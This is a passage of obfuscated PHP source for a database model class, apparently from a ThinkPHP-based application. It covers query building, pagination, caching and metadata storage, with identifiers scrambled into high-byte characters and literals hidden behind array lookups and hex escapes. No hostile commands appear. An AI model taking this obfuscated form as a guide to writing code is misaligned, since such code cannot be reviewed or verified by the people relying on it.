vsprintf($üµß‡™, $šğ¬ªİ¸); } else { $üµß‡™ = strtr($üµß‡™, array($ùÉàÆü[421] => $this->getTableName(), $ùÉàÆü[422] => think_config($ùÉàÆü[323]))); } $this->db->setModel($this->name); return $üµß‡™; } public function db($ş¬ş±‹Ã = '', $ı¾¨àËæ = '', $¢Ù‚±ÛÇ = array()) { $¢âÇŞ­Û =& $_SERVER[ÔÕ±ĞšÎ]; if ($¢âÇŞ­Û[12] === $ş¬ş±‹Ã && $this->db) { return $this->db; } static $Öé›Ø®¯ = array(); static $†Å»£„‚ = array(); if (!isset($†Å»£„‚[$ş¬ş±‹Ã]) || isset($†Å»£„‚[$ş¬ş±‹Ã]) && $ı¾¨àËæ && $Öé›Ø®¯[$ş¬ş±‹Ã] != $ı¾¨àËæ) { if (!empty($ı¾¨àËæ) && is_string($ı¾¨àËæ) && !1 === strpos($ı¾¨àËæ, $¢âÇŞ­Û[8])) { $ı¾¨àËæ = think_config($ı¾¨àËæ); } $ş¬ş±‹Ã = think_guid($ı¾¨àËæ); $†Å»£„‚[$ş¬ş±‹Ã] = Db::getInstance($ı¾¨àËæ); } elseif (NULL === $ı¾¨àËæ) { $†Å»£„‚[$ş¬ş±‹Ã]->close(); unset($†Å»£„‚[$ş¬ş±‹Ã]); return; } if (!empty($¢Ù‚±ÛÇ)) { if (is_string($¢Ù‚±ÛÇ)) { parse_str($¢Ù‚±ÛÇ, $¢Ù‚±ÛÇ); } foreach ($¢Ù‚±ÛÇ as $®Ä‡š³ï => $æ‰½²‹Ç) { $this->setProperty($®Ä‡š³ï, $æ‰½²‹Ç); } } $Öé›Ø®¯[$ş¬ş±‹Ã] = $ı¾¨àËæ; $this->db = $†Å»£„‚[$ş¬ş±‹Ã]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $‚öœè‘¡ = get_class($this); if ($‚öœè‘¡ == $_SERVER[ÔÕ±ĞšÎ][423]) { return $this->name; } $this->name = substr($‚öœè‘¡, 0, -5); } return $this->name; } public function getTableName() { $õ…ÄÁ” =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($this->trueTableName)) { $­åÑÉòƒ = !empty($this->tablePrefix) ? $this->tablePrefix : $õ…ÄÁ”[12]; if (!empty($this->tableName)) { $­åÑÉòƒ .= $this->tableName; } else { $­åÑÉòƒ .= think_parse_name($this->name); } $this->trueTableName = strtolower($­åÑÉòƒ); } return (!empty($this->dbName) ? $this->dbName . $õ…ÄÁ”[10] : $õ…ÄÁ”[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $í¤üÀ‡æ =& $_SERVER[ÔÕ±ĞšÎ]; return isset($this->fields[$í¤üÀ‡æ[330]]) ? $this->fields[$í¤üÀ‡æ[330]] : $this->pk; } public function getDbFields() { $úï•ïİ‚ =& $_SERVER[ÔÕ±ĞšÎ]; if (isset($this->options[$úï•ïİ‚[358]])) { $œ«–å¨ = $this->db->getFields($this->options[$úï•ïİ‚[358]]); return $œ«–å¨ ? array_keys($œ«–å¨) : !1; } if ($this->fields) { $œ«–å¨ = $this->fields; unset($œ«–å¨[$úï•ïİ‚[329]], $œ«–å¨[$úï•ïİ‚[330]], $œ«–å¨[$úï•ïİ‚[331]], $œ«–å¨[$úï•ïİ‚[328]]); return $œ«–å¨; } return !1; } public function data($ö‡åŞÕ‘ = '') { $èŸ›°®š =& $_SERVER[ÔÕ±ĞšÎ]; if ($èŸ›°®š[12] === $ö‡åŞÕ‘ && !empty($this->data)) { return $this->data; } if (is_object($ö‡åŞÕ‘)) { $ö‡åŞÕ‘ = get_object_vars($ö‡åŞÕ‘); } elseif (is_string($ö‡åŞÕ‘)) { parse_str($ö‡åŞÕ‘, $ö‡åŞÕ‘); } elseif (!is_array($ö‡åŞÕ‘)) { think_exception(think_lang($èŸ›°®š[350])); } $this->data = $ö‡åŞÕ‘; return $this; } public function join($ĞĞ™Öùó) { $ãĞ†ì›¥ =& $_SERVER[ÔÕ±ĞšÎ]; if (is_array($ĞĞ™Öùó)) { $this->options[$ãĞ†ì›¥[361]] = $ĞĞ™Öùó; } elseif (!empty($ĞĞ™Öùó)) { $this->options[$ãĞ†ì›¥[361]][] = $ĞĞ™Öùó; } return $this; } public function union($Ô‡ÁÔ¸æ, $–Õœ à‰ = false) { $ĞÓ’À¢§ =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($Ô‡ÁÔ¸æ)) { return $this; } if ($–Õœ à‰) { $this->options[$ĞÓ’À¢§[424]][$ĞÓ’À¢§[425]] = !0; } if (is_object($Ô‡ÁÔ¸æ)) { $Ô‡ÁÔ¸æ = get_object_vars($Ô‡ÁÔ¸æ); } if (is_string($Ô‡ÁÔ¸æ)) { $‹¦âòÖ¾ = $Ô‡ÁÔ¸æ; } elseif (is_array($Ô‡ÁÔ¸æ)) { if (isset($Ô‡ÁÔ¸æ[0])) { $this->options[$ĞÓ’À¢§[424]] = array_merge($this->options[$ĞÓ’À¢§[424]], $Ô‡ÁÔ¸æ); return $this; } else { $‹¦âòÖ¾ = $Ô‡ÁÔ¸æ; } } else { think_exception(think_lang($ĞÓ’À¢§[350])); } $this->options[$ĞÓ’À¢§[424]][] = $‹¦âòÖ¾; return $this; } public function cache($Íª‹ª¯” = true, $Ö—§Ü´ = null, $ê˜‚¡¬ = '') { $Æ‚Õü³Œ =& $_SERVER[ÔÕ±ĞšÎ]; if (!1 !== $Íª‹ª¯”) { $this->options[$Æ‚Õü³Œ[426]] = array($Æ‚Õü³Œ[97] => $Íª‹ª¯”, $Æ‚Õü³Œ[416] => $Ö—§Ü´, $Æ‚Õü³Œ[33] => $ê˜‚¡¬); } return $this; } public function field($™ğì©Òí, $ô°šØ»ö = false) { $ïèó£ =& $_SERVER[ÔÕ±ĞšÎ]; if (!0 === $™ğì©Òí) { $££Ë×°Ü = $this->getDbFields(); $™ğì©Òí = $££Ë×°Ü ? $££Ë×°Ü : $ïèó£[222]; } elseif ($ô°šØ»ö) { if (is_string($™ğì©Òí)) { $™ğì©Òí = explode($ïèó£[50], $™ğì©Òí); } $££Ë×°Ü = $this->getDbFields(); $™ğì©Òí = $££Ë×°Ü ? array_diff($££Ë×°Ü, $™ğì©Òí) : $™ğì©Òí; } $this->options[$ïèó£[352]] = $™ğì©Òí; return $this; } public function scope($şŒÇ½’ = '', $àĞÓŠ‰¶ = NULL) { $ë³ô³Õ‚ =& $_SERVER[ÔÕ±ĞšÎ]; if ($ë³ô³Õ‚[12] === $şŒÇ½’) { if (isset($this->_scope[$ë³ô³Õ‚[37]])) { $üËŒ³¥º = $this->_scope[$ë³ô³Õ‚[37]]; } else { return $this; } } elseif (is_string($şŒÇ½’)) { $İº Ş“ï = explode($ë³ô³Õ‚[50], $şŒÇ½’); $üËŒ³¥º = array(); foreach ($İº Ş“ï as $©«áşÆ) { if (!isset($this->_scope[$©«áşÆ])) { continue; } $üËŒ³¥º = array_merge($üËŒ³¥º, $this->_scope[$©«áşÆ]); } if (!empty($àĞÓŠ‰¶) && is_array($àĞÓŠ‰¶)) { $üËŒ³¥º = array_merge($üËŒ³¥º, $àĞÓŠ‰¶); } } elseif (is_array($şŒÇ½’)) { $üËŒ³¥º = $şŒÇ½’; } if (is_array($üËŒ³¥º) && !empty($üËŒ³¥º)) { $this->options = array_merge($this->options, array_change_key_case($üËŒ³¥º)); } return $this; } public function where($ßæßŞË÷, $¬­×¥Šˆ = null) { $ãÌ¶àßÏ =& $_SERVER[ÔÕ±ĞšÎ]; if (!is_null($¬­×¥Šˆ) && is_string($ßæßŞË÷)) { if (!is_array($¬­×¥Šˆ)) { $¬­×¥Šˆ = func_get_args(); array_shift($¬­×¥Šˆ); } $¬­×¥Šˆ = array_map(array($this->db, $ãÌ¶àßÏ[420]), $¬­×¥Šˆ); $ßæßŞË÷ = vsprintf($ßæßŞË÷, $¬­×¥Šˆ); } elseif (is_object($ßæßŞË÷)) { $ßæßŞË÷ = get_object_vars($ßæßŞË÷); } elseif (is_array($ßæßŞË÷)) { foreach ($ßæßŞË÷ as $ÓåÆ“âã => $©Õİ˜æ—) { if ((is_numeric($ÓåÆ“âã) || !$ÓåÆ“âã) && is_string($©Õİ˜æ—)) { if (strpos($©Õİ˜æ—, $ãÌ¶àßÏ[427]) === 0) { continue; } think_trace($ãÌ¶àßÏ[428], $ãÌ¶àßÏ[12], $ãÌ¶àßÏ[49]); die; } } } if (is_string($ßæßŞË÷) && $ãÌ¶àßÏ[12] != $ßæßŞË÷) { $Áë­ìü® = array(); $Áë­ìü®[$ãÌ¶àßÏ[429]] = $ßæßŞË÷; $ßæßŞË÷ = $Áë­ìü®; } if (isset($this->options[$ãÌ¶àßÏ[354]])) { $this->options[$ãÌ¶àßÏ[354]] = array_merge($this->options[$ãÌ¶àßÏ[354]], $ßæßŞË÷); } else { $this->options[$ãÌ¶àßÏ[354]] = $ßæßŞË÷; } return $this; } public function limit($åäÊßç, $½½É‘ÔÓ = null) { $„ÆÈé©€ =& $_SERVER[ÔÕ±ĞšÎ]; $this->options[$„ÆÈé©€[369]] = is_null($½½É‘ÔÓ) ? $åäÊßç : $åäÊßç . $„ÆÈé©€[50] . $½½É‘ÔÓ; return $this; } public function page($ŞÌü¼ò, $ø¸‡¦ÉÑ = null) { $¨ı«úî =& $_SERVER[ÔÕ±ĞšÎ]; $this->options[$¨ı«úî[430]] = is_null($ø¸‡¦ÉÑ) ? $ŞÌü¼ò : $ŞÌü¼ò . $¨ı«úî[50] . $ø¸‡¦ÉÑ; return $this; } public function comment($ò¼‡©ß…) { $this->options[$_SERVER[ÔÕ±ĞšÎ][431]] = $ò¼‡©ß…; return $this; } public function setProperty($ù’§³ºç, $ÃŠ¦‚©ˆ) { if (property_exists($this, $ù’§³ºç)) { $this->{$ù’§³ºç} = $ÃŠ¦‚©ˆ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\x66\x79\124\151\x6d\x65", "\x74\151\155\x65", "\x69\156\x73\x65\x72\x74\x2c\x75\160\x64\x61\164\x65", "\x66\x75\156\x63\164\x69\x6f\156"), array("\x63\162\x65\141\164\145\124\151\155\145", "\164\151\x6d\x65", "\x69\156\163\x65\x72\164", "\146\x75\156\x63\x74\x69\x6f\156")); public function setDataAuto($š½ƒ†ø¢) { $this->dataAuto = $š½ƒ†ø¢; } public function __construct($áÁÇÑ = '', $›‹Ø§¾ä = '', $§Éßñèı = '') { parent::__construct($áÁÇÑ, $›‹Ø§¾ä, $§Éßñèı); } protected $tableMeta = array(); protected function _beforeInsert(&$¡Æ›è‰, $Ÿ÷È—æ‘) { $’­Î·Öš =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->checkDataAutoHas($’­Î·Öš[432])) { return; } $this->dataBeforeFilter($¡Æ›è‰, $’­Î·Öš[432]); } protected function _beforeUpdate(&$ˆ˜¼ºì¹, $ÉŸÌ†ì¸) { $¥±†çŒŒ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->checkDataAutoHas($¥±†çŒŒ[433])) { return; } $this->dataBeforeFilter($ˆ˜¼ºì¹, $¥±†çŒŒ[433]); } protected function _afterSelect(&$á¡×ÚÇù, $ŸÌ¾ñÌ‡) { if (!is_array($á¡×ÚÇù)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÔÕ±ĞšÎ][434])) { return; } foreach ($á¡×ÚÇù as &$ä³£Ôúˆ) { $this->dataAfterFilter($ä³£Ôúˆ); } unset($ä³£Ôúˆ); } protected function _afterFind(&$ÇÓµà‘ß, $—ëÈĞê) { if (!is_array($ÇÓµà‘ß)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÔÕ±ĞšÎ][434])) { return; } $this->dataAfterFilter($ÇÓµà‘ß); } public static function textEncode($¯­µ ‹Î) { if (!$¯­µ ‹Î) { return $¯­µ ‹Î; } $‚îĞ¼È = json_encode($¯­µ ‹Î); $‚îĞ¼È = preg_replace_callback($_SERVER[ÔÕ±ĞšÎ][435], function ($¯ßÇĞ½‡) { return addslashes($¯ßÇĞ½‡[0]); }, $‚îĞ¼È); return json_decode($‚îĞ¼È); } public static function textDecode($‚İ÷š£) { $Ş³ù¶§ =& $_SERVER[ÔÕ±ĞšÎ]; $‡¶Û¦Ì¾ = json_encode($‚İ÷š£); $‡¶Û¦Ì¾ = preg_replace_callback($Ş³ù¶§[436], function ($Ù›ŸÜÙ¦) { return $_SERVER[ÔÕ±ĞšÎ][100]; }, $‡¶Û¦Ì¾); return json_decode($‡¶Û¦Ì¾); } public function setAutoIncrement($€û’·Ú) { $ò¢ëÕÚ¿ = array($this->getPk() => $€û’·Ú); $ƒ‡‡ää² = $this->data($ò¢ëÕÚ¿)->add(); if ($ƒ‡‡ää²) { $this->delete($ƒ‡‡ää²); } } public function getAutoIncrement() { $ãøİÀ¢Î = $this->getTableName(); $ôó›Î = $this->max($this->getPk()); $ë“ã“Ëå = $this->query("\163\x68\x6f\x77\40\164\x61\x62\154\x65\x20\163\x74\141\164\x75\x73\x20\x77\150\145\x72\x65\40\116\x61\155\145\75\47{$ãøİÀ¢Î}\x27"); $»„”½ÁÙ = $ë“ã“Ëå[0][$_SERVER[ÔÕ±ĞšÎ][437]]; $†¹•Ôğ = max($ôó›Î, $»„”½ÁÙ); return $†¹•Ôğ; } protected function _callBefore($½ğİè±Û, $Ùˆ…éı“) { return $this->cacheCallCheck($½ğİè±Û, $Ùˆ…éı“, !1); } protected function _callAfter($®‘Û°òö, $êœ’±é) { return $this->cacheCallCheck($®‘Û°òö, $êœ’±é, !0); } protected function cacheFunctionAlias($óÙê×™Ê) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($«ÈÓ“ó, $öó†·•, $–ò•È— = false) { $Ë²á³è =& $_SERVER[ÔÕ±ĞšÎ]; $ÆÆšŞ¦ = $this->cacheFunctionAlias($öó†·•); if (!$ÆÆšŞ¦) { return; } foreach ($ÆÆšŞ¦ as $à¨àÔÕÍ => $â†¥¡Ùş) { $ÁƒÆÜËÌ = $â†¥¡Ùş[0]; $åé¶³ÚÓ = explode($Ë²á³è[50], $â†¥¡Ùş[1]); $Ÿõ–Ñş = isset($â†¥¡Ùş[2]) ? $â†¥¡Ùş[2] : $Ë²á³è[12]; if ($«ÈÓ“ó == $à¨àÔÕÍ) { return $this->cacheFunctionGet($à¨àÔÕÍ, $ÁƒÆÜËÌ, $Ÿõ–Ñş); } if ($–ò•È— && in_array($«ÈÓ“ó, $åé¶³ÚÓ)) { $this->cacheFunctionClear($à¨àÔÕÍ, $ÁƒÆÜËÌ, $Ÿõ–Ñş); } } } public function cacheFunctionGet($éÑ…Úü, $¡™¥ ¦ø, $şšşú¥ó = '') { $èˆî££¡ = $this->cacheKeyMake($éÑ…Úü, $¡™¥ ¦ø, $şšşú¥ó); $øôÃ½¾ = Cache::get($èˆî££¡); if (!is_array($øôÃ½¾)) { $øôÃ½¾ = call_user_func_array(array($this, $éÑ…Úü), array($¡™¥ ¦ø, !0)); Cache::set($èˆî££¡, $øôÃ½¾); } return $øôÃ½¾; } public function cacheFunctionClear($ŞÜš×Ìà, $‘ô¹“, $ü£‡çÈ = '') { $¹ÀÑ³Ö = $‘ô¹“; if (!is_array($‘ô¹“)) { $¹ÀÑ³Ö = array($‘ô¹“); } foreach ($¹ÀÑ³Ö as $®ê˜ëŒ¬) { $æ×€»ûô = $this->cacheKeyMake($ŞÜš×Ìà, $®ê˜ëŒ¬, $ü£‡çÈ); Cache::remove($æ×€»ûô); } } private function cacheKeyMake($õ›şä, $Ì£æ–û, $­×õ‡äò) { $à‘·ìÔ½ =& $_SERVER[ÔÕ±ĞšÎ]; if ($­×õ‡äò) { $Ì£æ–û = $Ì£æ–û . $à‘·ìÔ½[438] . $­×õ‡äò; } return get_class($this) . $à‘·ìÔ½[11] . $õ›şä . $à‘·ìÔ½[439] . $Ì£æ–û; } protected function selectPageReset() { $³‘£é´¥ =& $_SERVER[ÔÕ±ĞšÎ]; if (isset($GLOBALS[$³‘£é´¥[440]])) { return; } $GLOBALS[$³‘£é´¥[440]] = isset($GLOBALS[$³‘£é´¥[7]][$³‘£é´¥[441]]) ? $GLOBALS[$³‘£é´¥[7]][$³‘£é´¥[441]] : !1; $GLOBALS[$³‘£é´¥[442]] = isset($GLOBALS[$³‘£é´¥[7]][$³‘£é´¥[430]]) ? $GLOBALS[$³‘£é´¥[7]][$³‘£é´¥[430]] : !1; $GLOBALS[$³‘£é´¥[7]][$³‘£é´¥[441]] = !1; $GLOBALS[$³‘£é´¥[7]][$³‘£é´¥[430]] = !1; } protected function selectPageRestore() { $œ‰àÑ¼÷ =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($GLOBALS[$œ‰àÑ¼÷[440]])) { return; } $GLOBALS[$œ‰àÑ¼÷[7]][$œ‰àÑ¼÷[441]] = $GLOBALS[$œ‰àÑ¼÷[440]]; $GLOBALS[$œ‰àÑ¼÷[7]][$œ‰àÑ¼÷[430]] = $GLOBALS[$œ‰àÑ¼÷[442]]; if ($GLOBALS[$œ‰àÑ¼÷[7]][$œ‰àÑ¼÷[441]] === !1) { unset($GLOBALS[$œ‰àÑ¼÷[7]][$œ‰àÑ¼÷[441]]); } if ($GLOBALS[$œ‰àÑ¼÷[7]][$œ‰àÑ¼÷[430]] === !1) { unset($GLOBALS[$œ‰àÑ¼÷[7]][$œ‰àÑ¼÷[430]]); } unset($GLOBALS[$œ‰àÑ¼÷[440]]); unset($GLOBALS[$œ‰àÑ¼÷[442]]); } protected function selectPage($Ò’Õü­ = 200, $¯„›‡‚º = 1) { $æÄ¤û€ =& $_SERVER[ÔÕ±ĞšÎ]; global $in; $ë­ê°™ç = $this->optionsValue(); $¨‚¶±­ = 50000; $Ò’Õü­ = isset($in[$æÄ¤û€[441]]) && $in[$æÄ¤û€[441]] ? $in[$æÄ¤û€[441]] : $Ò’Õü­; if ($Ò’Õü­ === -1) { $in[$æÄ¤û€[441]] = !1; $¨‚¶±­ = 100000000; $Ò’Õü­ = $¨‚¶±­; } $èÉøô£ = $ë­ê°™ç; $èÉøô£[$æÄ¤û€[443]] = array(); $Ò’Õü­ = intval($Ò’Õü­); $Ò’Õü­ = $Ò’Õü­ <= 5 ? 5 : ($Ò’Õü­ >= $¨‚¶±­ ? $¨‚¶±­ : $Ò’Õü­); $¯„›‡‚º = intval(isset($in[$æÄ¤û€[430]]) && $in[$æÄ¤û€[430]] ? $in[$æÄ¤û€[430]] : $¯„›‡‚º); $¯„›‡‚º = $¯„›‡‚º <= 1 ? 1 : $¯„›‡‚º; $ÄäÉ¯é£ = array(); $öÓîĞË¹ = 1; if ($¯„›‡‚º == 1 && $öÓîĞË¹) { $this->optionsValue($ë­ê°™ç); $ÄäÉ¯é£ = $this->page($¯„›‡‚º, $Ò’Õü­)->select(); $›àÆ°ª = is_array($ÄäÉ¯é£) ? count($ÄäÉ¯é£) : 0; if ($›àÆ°ª < $Ò’Õü­) { $«ØÁ´å = 1; } else { $this->optionsValue($èÉøô£); $›àÆ°ª = intval($this->count()); $«ØÁ´å = ceil($›àÆ°ª / $Ò’Õü­); } } else { $this->optionsValue($èÉøô£); $›àÆ°ª = intval($this->count()); $«ØÁ´å = ceil($›àÆ°ª / $Ò’Õü­); $¯„›‡‚º = $¯„›‡‚º >= $«ØÁ´å ? $«ØÁ´å : $¯„›‡‚º; $this->optionsValue($ë­ê°™ç); $ÄäÉ¯é£ = $this->page($¯„›‡‚º, $Ò’Õü­)->select(); } if (!is_array($ÄäÉ¯é£)) { $ÄäÉ¯é£ = array(); } if ($«ØÁ´å == 1) { $›àÆ°ª = count($ÄäÉ¯é£); } $½¥Àşá = array($æÄ¤û€[444] => array($æÄ¤û€[445] => $›àÆ°ª, $æÄ¤û€[441] => $Ò’Õü­, $æÄ¤û€[430] => $¯„›‡‚º, $æÄ¤û€[446] => $«ØÁ´å), $æÄ¤û€[447] => $ÄäÉ¯é£); return $½¥Àşá; } protected function checkLength($é’Ÿñ™å, $ÇâÁÚ•Ÿ = 0, $Óöú¾Ÿß = '') { $ÅÉÒóĞ° =& $_SERVER[ÔÕ±ĞšÎ]; $ÇâÁÚ•Ÿ = $ÇâÁÚ•Ÿ ? $ÇâÁÚ•Ÿ : 65536; if (!$é’Ÿñ™å || strlen($é’Ÿñ™å) < $ÇâÁÚ•Ÿ) { return; } $Óöú¾Ÿß = $Óöú¾Ÿß ? $Óöú¾Ÿß . $ÅÉÒóĞ°[74] : $ÅÉÒóĞ°[12]; show_json($Óöú¾Ÿß . LNG($ÅÉÒóĞ°[448]) . "\50{$ÇâÁÚ•Ÿ}\x29", !1); } protected function metaSet($ç¨³øÇ, $ï¦ƒ–¡ü = null, $ÄÂç¶©î = null) { $‹ šã× =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->tableMeta || !$ç¨³øÇ) { return !1; } $Ãªé°‹ö = $this->tableMeta[$‹ šã×[449]]; $óÇ¿ÏÇ = $this->tableMeta[$‹ šã×[450]]; $İñ¦Ô•æ = Model($óÇ¿ÏÇ); $à³ı¡Ö = array($Ãªé°‹ö => $ç¨³øÇ, $‹ šã×[451] => $ï¦ƒ–¡ü); if (is_null($ï¦ƒ–¡ü)) { return $İñ¦Ô•æ->where(array($Ãªé°‹ö => $ç¨³øÇ))->delete(); } if (is_null($ÄÂç¶©î) && is_string($ï¦ƒ–¡ü)) { return $İñ¦Ô•æ->where($à³ı¡Ö)->delete(); } $ÊõœşÏ = is_array($ï¦ƒ–¡ü) ? $ï¦ƒ–¡ü : array(); if (is_string($ï¦ƒ–¡ü)) { $ÊõœşÏ[$ï¦ƒ–¡ü] = $ÄÂç¶©î; } $«×Ã½‚´ = array(); foreach ($ÊõœşÏ as $³ÜÚı => $ËÌóâ—) { if (is_null($ËÌóâ—) && is_string($³ÜÚı)) { $İñ¦Ô•æ->where(array($Ãªé°‹ö => $ç¨³øÇ, $‹ šã×[451] => $³ÜÚı))->delete(); continue; } $this->checkLength($ËÌóâ—, !1, $óÇ¿ÏÇ . $‹ šã×[4] . $³ÜÚı); $«×Ã½‚´[] = array($Ãªé°‹ö => $ç¨³øÇ, $‹ šã×[97] => $³ÜÚı, $‹ šã×[452] => $ËÌóâ—); } $’ìúğé± = $‹ šã×[453] . $óÇ¿ÏÇ; CacheLock::lock($’ìúğé±); $İñ¦Ô•æ->where(array($Ãªé°‹ö => $ç¨³øÇ))->addAll($«×Ã½‚´, array(), !0); CacheLock::unlock($’ìúğé±); return !0; } public function metaGet($ù¡—¦, $©½óÑÖò = false) { $ĞÉµç„ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->tableMeta) { return array(); } $Ô¯Óá¶ó = $this->tableMeta[$ĞÉµç„[449]]; $ÍšÛ•Áş = Model($this->tableMeta[$ĞÉµç„[450]]); if ($©½óÑÖò) { $İùÄ¢ô– = array($Ô¯Óá¶ó => $ù¡—¦, $ĞÉµç„[97] => $©½óÑÖò); return $ÍšÛ•Áş->where($İùÄ¢ô–)->getField($ĞÉµç„[452]); } $İùÄ¢ô– = array($Ô¯Óá¶ó => $ù¡—¦); $„…Ìü”Í = $ÍšÛ•Áş->field($ĞÉµç„[454])->where($İùÄ¢ô–)->select(); $„…Ìü”Í = array_to_keyvalue($„…Ìü”Í, $ĞÉµç„[97], $ĞÉµç„[452]); return $„…Ìü”Í; } private function checkDataAutoHas($ñºÇ¿¸­) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $š¡±²ì) { if (in_array($ñºÇ¿¸­, explode($_SERVER[ÔÕ±ĞšÎ][50], $š¡±²ì[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$îÍÊÕÆò, $Çñ¬) { $œ¡ÕŒ– =& $_SERVER[ÔÕ±ĞšÎ]; if (!is_array($îÍÊÕÆò)) { return; } foreach ($this->dataAuto as $ÚÈÚ®©¨) { $Á±ÅãĞš = $ÚÈÚ®©¨[0]; if (!in_array($Çñ¬, explode($œ¡ÕŒ–[50], $ÚÈÚ®©¨[2]))) { continue; } switch (trim($ÚÈÚ®©¨[3])) { case $œ¡ÕŒ–[398]: case $œ¡ÕŒ–[399]: $ÙóªÖãÀ = $ÚÈÚ®©¨[1]; $Å¸şß´ = isset($ÚÈÚ®©¨[4]) ? (array) $ÚÈÚ®©¨[4] : array(); if ($ÙóªÖãÀ == $œ¡ÕŒ–[206] && array_key_exists($Á±ÅãĞš, $îÍÊÕÆò)) { if (!$îÍÊÕÆò[$Á±ÅãĞš]) { unset($îÍÊÕÆò[$Á±ÅãĞš]); } break; } if (isset($îÍÊÕÆò[$Á±ÅãĞš])) { array_unshift($Å¸şß´, $îÍÊÕÆò[$Á±ÅãĞš]); } if ($œ¡ÕŒ–[398] == $ÚÈÚ®©¨[3]) { $îÍÊÕÆò[$Á±ÅãĞš] = call_user_func_array($ÙóªÖãÀ, $Å¸şß´); } else { $îÍÊÕÆò[$Á±ÅãĞš] = call_user_func_array(array(&$this, $ÙóªÖãÀ), $Å¸şß´); } break; case $œ¡ÕŒ–[349]: if (isset($îÍÊÕÆò[$Á±ÅãĞš]) && $îÍÊÕÆò[$Á±ÅãĞš]) { $îÍÊÕÆò[$Á±ÅãĞš] = call_user_func_array(array(&$this, $ÚÈÚ®©¨[1]), array($îÍÊÕÆò[$Á±ÅãĞš])); } break; case $œ¡ÕŒ–[352]: $îÍÊÕÆò[$Á±ÅãĞš] = $îÍÊÕÆò[$ÚÈÚ®©¨[1]]; break; case $œ¡ÕŒ–[371]: if (isset($îÍÊÕÆò[$Á±ÅãĞš]) && !is_string($îÍÊÕÆò[$Á±ÅãĞš])) { $îÍÊÕÆò[$Á±ÅãĞš] = json_encode_force($îÍÊÕÆò[$Á±ÅãĞš]); } break; case $œ¡ÕŒ–[400]: if ($îÍÊÕÆò[$Á±ÅãĞš] === $œ¡ÕŒ–[12]) { unset($îÍÊÕÆò[$Á±ÅãĞš]); } break; case $œ¡ÕŒ–[401]: $îÍÊÕÆò[$Á±ÅãĞš] = $ÚÈÚ®©¨[1]; default: break; } } if ($Çñ¬ == $œ¡ÕŒ–[432]) { $ò€¯“ã‚ = strtolower($this->db->getDbType()); if (strpos($ò€¯“ã‚, $œ¡ÕŒ–[13]) !== 0) { return; } $‚§‚†¶ = $this->field(!0)->fields; $®ìØİ”ı = $‚§‚†¶[$œ¡ÕŒ–[331]]; if (isset($‚§‚†¶[$œ¡ÕŒ–[330]])) { unset($®ìØİ”ı[$‚§‚†¶[$œ¡ÕŒ–[330]]]); } foreach ($®ìØİ”ı as $™¾Ó–÷¿ => $Çñ¬) { if (!isset($îÍÊÕÆò[$™¾Ó–÷¿])) { $îÍÊÕÆò[$™¾Ó–÷¿] = $œ¡ÕŒ–[12]; } } } } private function dataAfterFilter(&$Ûï­â¨Í) { $ÓËîœĞ =& $_SERVER[ÔÕ±ĞšÎ]; foreach ($this->dataAuto as $ñÍÎªé) { $ÑÈğ­°ª = $ñÍÎªé[0]; if (!isset($Ûï­â¨Í[$ÑÈğ­°ª])) { continue; } if (!in_array($ÓËîœĞ[434], explode($ÓËîœĞ[50], $ñÍÎªé[2]))) { continue; } switch (trim($ñÍÎªé[3])) { case $ÓËîœĞ[398]: case $ÓËîœĞ[399]: $î×İÖ‘ = isset($ñÍÎªé[4]) ? (array) $ñÍÎªé[4] : array(); array_unshift($î×İÖ‘, $Ûï­â¨Í[$ÑÈğ­°ª]); if (isset($ñÍÎªé[4]) && $ñÍÎªé[4] == $ÓËîœĞ[455]) { $î×İÖ‘ = array($Ûï­â¨Í[$ÑÈğ­°ª]); } if ($ÓËîœĞ[398] == $ñÍÎªé[3]) { $Ûï­â¨Í[$ÑÈğ­°ª] = call_user_func_array($ñÍÎªé[1], $î×İÖ‘); } else { $Ûï­â¨Í[$ÑÈğ­°ª] = call_user_func_array(array(&$this, $ñÍÎªé[1]), $î×İÖ‘); } break; case $ÓËîœĞ[349]: if (isset($Ûï­â¨Í[$ÑÈğ­°ª]) && $Ûï­â¨Í[$ÑÈğ­°ª]) { $Ûï­â¨Í[$ÑÈğ­°ª] = call_user_func_array(array(&$this, $ñÍÎªé[1]), array($Ûï­â¨Í[$ÑÈğ­°ª])); } break; case $ÓËîœĞ[352]: $Ûï­â¨Í[$ÑÈğ­°ª] = $Ûï­â¨Í[$ñÍÎªé[1]]; break; case $ÓËîœĞ[371]: $—³õ×€» = $Ûï­â¨Í[$ÑÈğ­°ª]; $Ûï­â¨Í[$ÑÈğ­°ª] = json_decode($—³õ×€», !0); if (is_null($Ûï­â¨Í[$ÑÈğ­°ª])) { $Ûï­â¨Í[$ÑÈğ­°ª] = $—³õ×€»; } break; case $ÓËîœĞ[400]: if ($Ûï­â¨Í[$ÑÈğ­°ª] === $ÓËîœĞ[12]) { unset($Ûï­â¨Í[$ÑÈğ­°ª]); } break; case $ÓËîœĞ[401]: $Ûï­â¨Í[$ÑÈğ­°ª] = $ñÍÎªé[1]; break; default: break; } } } public function saveAll($çéü±Ñ¯) { $‹Ÿİï¢» =& $_SERVER[ÔÕ±ĞšÎ]; $Û´ê­ÓÉ = $this->tablePrefix . $this->tableName; $¥Š’¿œ… = self::SQL_WHERE_IN_CHUNK; $çéü±Ñ¯ = is_array($çéü±Ñ¯) ? $çéü±Ñ¯ : array(); $©Õûıé¶ = 